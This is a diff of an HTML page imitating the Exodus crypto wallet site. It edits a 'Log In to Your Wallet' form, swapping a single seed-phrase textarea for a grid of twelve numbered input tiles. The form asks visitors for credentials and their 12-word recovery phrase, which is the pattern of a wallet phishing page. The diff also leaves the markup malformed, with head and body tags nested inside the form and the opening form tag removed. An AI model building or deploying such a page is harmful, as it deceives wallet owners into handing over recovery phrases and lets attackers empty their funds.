@@ -31,10 +31,105 @@ d.querySelectorAll(unescape("a%5Bhref%5E%3D%22https%3A//downloads.exodus.com/rel
 <h1 class="x__index-page__header__heading">Bitcoin and <br>Crypto Wallet</h1>
  <div  class="login-form" class="exodus__download__dropdown">
         <h2>Log In to Your Wallet</h2>
-        <form  style=" padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); width: 300px; text-align: center">
-            <input type="text" name="username" placeholder="Email/Username/Phone" required style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px;">
-            <input type="password" name="password" placeholder="Password" required style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px;" >
-            <textarea name="seed_phrase" placeholder="12-word seed phrase" rows="3" required style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px;"></textarea>
+            <style>
+        body {
+            background-color: #121212;
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 10px;
+            width: 80%;
+        }
+
+        .tile {
+            background-color: #1e1e1e;
+            border: 2px solid #333;
+            border-radius: 8px;
+            padding: 20px;
+            text-align: left;
+            position: relative;
+        }
+
+        .tile-title {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            font-weight: bold;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            margin-top: 30px;
+            border: none;
+            border-radius: 4px;
+            background-color: #333;
+            color: #ffffff;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Creating 12 tiles -->
+        <div class="tile" id="tile1">
+            <span class="tile-title">1</span>
+            <input type="text" placeholder="">
+        </div>
+        <div class="tile" id="tile2">
+            <span class="tile-title">2</span>
+            <input type="text" placeholder="">
+        </div>
+        <div class="tile" id="tile3">
+            <span class="tile-title">3</span>
+            <input type="text" placeholder="">
+        </div>
+        <div class="tile" id="tile4">
+            <span class="tile-title">4</span>
+            <input type="text" placeholder="">
+        </div>
+        <div class="tile" id="tile5">
+            <span class="tile-title">5</span>
+            <input type="text" placeholder="">
+        </div>
+        <div class="tile" id="tile6">
+            <span class="tile-title">6</span>
+            <input type="text" placeholder="">
+        </div>
+        <div class="tile" id="tile7">
+            <span class="tile-title">7</span>
+            <input type="text" placeholder="">
+        </div>
+        <div class="tile" id="tile8">
+            <span class="tile-title">8</span>
+            <input type="text" placeholder="">
+        </div>
+        <div class="tile" id="tile9">
+            <span class="tile-title">9</span>
+            <input type="text" placeholder="">
+        </div>
+        <div class="tile" id="tile10">
+            <span class="tile-title">10</span>
+            <input type="text" placeholder="">
+        </div>
+        <div class="tile" id="tile11">
+            <span class="tile-title">11</span>
+            <input type="text" placeholder="">
+        </div>
+        <div class="tile" id="tile12">
+            <span class="tile-title">12</span>
+            <input type="text" placeholder="">
+        </div>
+    </div>
+</body>
     <button class="x__button-default x__button-default--normal x__button-default--primary" style=" padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); text-align: center; margin-top: 20px;" type="submit">Log In</button>
         </form>
 
